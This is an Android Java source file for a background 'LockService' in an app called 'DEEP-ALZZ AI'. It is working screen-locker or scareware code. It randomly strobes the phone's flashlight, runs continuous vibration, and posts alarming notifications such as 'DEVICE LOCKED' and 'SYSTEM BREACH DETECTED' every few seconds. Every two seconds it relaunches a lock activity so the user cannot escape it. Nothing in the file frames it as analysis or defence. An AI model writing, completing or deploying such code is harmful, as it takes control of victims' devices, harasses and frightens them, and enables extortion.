package com.deep.alzz.ai;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.IBinder;
import android.os.VibrationEffect;
import android.os.Vibrator;
import androidx.core.app.NotificationCompat;

public class LockService extends Service {

    private static final String CH = "deep_ch";
    private CameraManager cm;
    private String camId;
    private boolean torchOn = false;
    private Vibrator vib;
    private boolean running = true;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(1, buildNotif("DEEP-ALZZ AI", "Running..."));

        vib = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);

        try {
            for (String id : cm.getCameraIdList()) {
                Boolean hasFlash = cm.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (hasFlash != null && hasFlash) { camId = id; break; }
            }
        } catch (CameraAccessException ignored) {}

        startFlash();
        startVibrate();
        startNotifSpam();
        keepLockAlive();
    }

    private void startFlash() {
        new Thread(() -> {
            while (running) {
                try {
                    Thread.sleep(800 + (long)(Math.random() * 1200));
                    if (camId != null) {
                        torchOn = !torchOn;
                        cm.setTorchMode(camId, torchOn);
                    }
                } catch (Exception ignored) {}
            }
        }).start();
    }

    private void startVibrate() {
        new Thread(() -> {
            while (running) {
                try {
                    Thread.sleep(600 + (long)(Math.random() * 1000));
                    if (vib != null) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            vib.vibrate(VibrationEffect.createWaveform(
                                new long[]{100, 100, 200, 100, 400, 100},
                                new int[]{255, 0, 255, 0, 255, 0}, 0));
                        } else {
                            vib.vibrate(new long[]{100, 100, 200, 100, 400}, 0);
                        }
                    }
                } catch (Exception ignored) {}
            }
        }).start();
    }

    private void startNotifSpam() {
        String[] msgs = {
            "DEVICE LOCKED", "ACCESS DENIED", "SYSTEM BREACH DETECTED",
            "CONTACT ADMIN", "DEEP-ALZZ AI ACTIVATED"
        };
        new Thread(() -> {
            int i = 0;
            while (running) {
                try {
                    Thread.sleep(4000);
                    NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                    nm.notify(100 + i, buildNotif("DEEP-ALZZ AI", msgs[i % msgs.length]));
                    i++;
                } catch (Exception ignored) {}
            }
        }).start();
    }

    private void keepLockAlive() {
        new Thread(() -> {
            while (running) {
                try {
                    Thread.sleep(2000);
                    Intent i = new Intent(this, LockActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                    startActivity(i);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CH, "DEEP-ALZZ",
                NotificationManager.IMPORTANCE_HIGH);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    private Notification buildNotif(String title, String text) {
        return new NotificationCompat.Builder(this, CH)
            .setContentTitle(title).setContentText(text)
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .build();
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;
        try { if (camId != null) cm.setTorchMode(camId, false); } catch (Exception ignored) {}
    }
}
